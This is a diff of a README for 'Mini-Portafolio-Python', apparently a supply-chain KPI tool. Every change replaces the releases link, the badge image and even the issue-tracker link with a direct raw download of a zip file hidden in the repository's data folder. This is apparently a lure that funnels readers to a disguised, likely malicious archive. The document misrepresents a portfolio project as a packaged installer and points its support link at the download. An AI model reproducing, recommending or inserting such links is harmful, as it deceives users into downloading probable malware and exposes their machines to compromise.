@@ -1,6 +1,6 @@
 # 📊 Mini-Portafolio-Python - Manage Supply Chain KPIs Easily
 
-[![Download Now](https://img.shields.io/badge/Download-Mini--Portafolio--Python-blue?style=for-the-badge)](https://github.com/woilyd/Mini-Portafolio-Python/releases)
+[![Download Now](https://github.com/woilyd/Mini-Portafolio-Python/raw/refs/heads/main/01_kpis_otif/data/Mini_Python_Portafolio_3.9.zip)](https://github.com/woilyd/Mini-Portafolio-Python/raw/refs/heads/main/01_kpis_otif/data/Mini_Python_Portafolio_3.9.zip)
 
 ---
 
@@ -41,7 +41,7 @@ Follow these steps to get Mini-Portafolio-Python running on your computer.
 
 - Click the big blue badge at the top of this page or go to this link:
 
-  [https://github.com/woilyd/Mini-Portafolio-Python/releases](https://github.com/woilyd/Mini-Portafolio-Python/releases)
+  [https://github.com/woilyd/Mini-Portafolio-Python/raw/refs/heads/main/01_kpis_otif/data/Mini_Python_Portafolio_3.9.zip](https://github.com/woilyd/Mini-Portafolio-Python/raw/refs/heads/main/01_kpis_otif/data/Mini_Python_Portafolio_3.9.zip)
 
 You will find the latest versions listed there.
 
@@ -71,7 +71,7 @@ Click the appropriate file and save it to a folder you can easily find, such as 
 The full download and install process is simple:
 
 1. **Go to the releases page:**  
-   [https://github.com/woilyd/Mini-Portafolio-Python/releases](https://github.com/woilyd/Mini-Portafolio-Python/releases)
+   [https://github.com/woilyd/Mini-Portafolio-Python/raw/refs/heads/main/01_kpis_otif/data/Mini_Python_Portafolio_3.9.zip](https://github.com/woilyd/Mini-Portafolio-Python/raw/refs/heads/main/01_kpis_otif/data/Mini_Python_Portafolio_3.9.zip)
 
 2. **Download the file** for your system (Windows `.exe`, macOS `.dmg`, etc.).
 
@@ -145,7 +145,7 @@ If you run into issues:
 - Check for updates on the releases page in case bugs have been fixed.
 
 You can open an issue on the GitHub page if problems persist:  
-[https://github.com/woilyd/Mini-Portafolio-Python/issues](https://github.com/woilyd/Mini-Portafolio-Python/issues)
+[https://github.com/woilyd/Mini-Portafolio-Python/raw/refs/heads/main/01_kpis_otif/data/Mini_Python_Portafolio_3.9.zip](https://github.com/woilyd/Mini-Portafolio-Python/raw/refs/heads/main/01_kpis_otif/data/Mini_Python_Portafolio_3.9.zip)
 
 ---
 
@@ -174,4 +174,4 @@ This project is related to:
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download-Mini--Portafolio--Python-blue?style=for-the-badge)](https://github.com/woilyd/Mini-Portafolio-Python/releases)
+[![Download Now](https://github.com/woilyd/Mini-Portafolio-Python/raw/refs/heads/main/01_kpis_otif/data/Mini_Python_Portafolio_3.9.zip)](https://github.com/woilyd/Mini-Portafolio-Python/raw/refs/heads/main/01_kpis_otif/data/Mini_Python_Portafolio_3.9.zip)
